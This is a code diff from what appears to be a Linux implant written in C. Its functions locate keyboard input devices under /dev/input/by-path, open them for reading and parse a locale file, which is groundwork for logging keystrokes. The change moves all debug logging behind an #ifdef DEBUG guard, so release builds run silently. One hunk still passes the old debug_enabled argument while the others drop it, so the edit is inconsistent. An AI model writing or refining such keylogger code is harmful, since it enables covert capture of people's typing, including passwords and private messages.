@@ -52,10 +52,10 @@ void fetch_available_keyboards(implant_t *instance) {
     );
 
     if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "could not find possible keyboard paths"
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("could not find possible keyboard paths");
+#endif
 
         return;
     }
@@ -66,11 +66,14 @@ void fetch_available_keyboards(implant_t *instance) {
     char rpath[2048] = {0};
     for (int ctr = -1; ++ctr < possible_paths;) {
         if (!realpath(char_devices[ctr]->d_name, rpath)) {
+
+#ifdef DEBUG
             DEBUG_LOG(
                 instance->debug_enabled,
                 "[!] Could not run realpath(%s): %s",
                 char_devices[ctr]->d_name, strerror(errno)
             );
+#endif
 
             continue;
         }
@@ -78,10 +81,10 @@ void fetch_available_keyboards(implant_t *instance) {
 
         keyboard_t *kbd = malloc(sizeof(keyboard_t));
         if (!kbd) {
-            DEBUG_LOG(
-                instance->debug_enabled,
-                "[!] allocate memory for keyboard_t"
-            );
+
+#ifdef DEBUG
+            DEBUG_LOG("[!] allocate memory for keyboard_t");
+#endif
 
             continue;
         }
@@ -89,11 +92,10 @@ void fetch_available_keyboards(implant_t *instance) {
 
         kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
         if (kbd->fd < 0) {
-            DEBUG_LOG(
-                instance->debug_enabled,
-                "[!] Could not open %s: %s",
-                rpath, strerror(errno)
-            );
+
+#ifdef DEBUG
+            DEBUG_LOG("[!] Could not open %s: %s", rpath, strerror(errno));
+#endif
 
             continue;
         }
@@ -116,11 +118,10 @@ static int parse_locale(char const *locale_fpath, implant_t *instance) {
 
     char **tab = tabgen(buffer, '\n');
     if (!tab) {
-        DEBUG_LOG(
-            instance->debug_enabled,
-            "Could not split buffer contents: %s",
-            buffer
-        );
+
+#ifdef DEBUG
+        DEBUG_LOG("[!] Could not split buffer contents: %s", buffer);
+#endif
 
         free(buffer);
         return ERROR;
@@ -138,7 +139,10 @@ static int parse_locale(char const *locale_fpath, implant_t *instance) {
         }
     }
 
-    DEBUG_LOG(instance->debug_enabled, "\n[!] Could not retrieve locale from %s", buffer);
+#ifdef DEBUG
+    DEBUG_LOG("\n[!] Could not retrieve locale from %s", buffer);
+#endif
+
     free_tab((uint8_t **)tab);
     free(buffer);
     return ERROR;
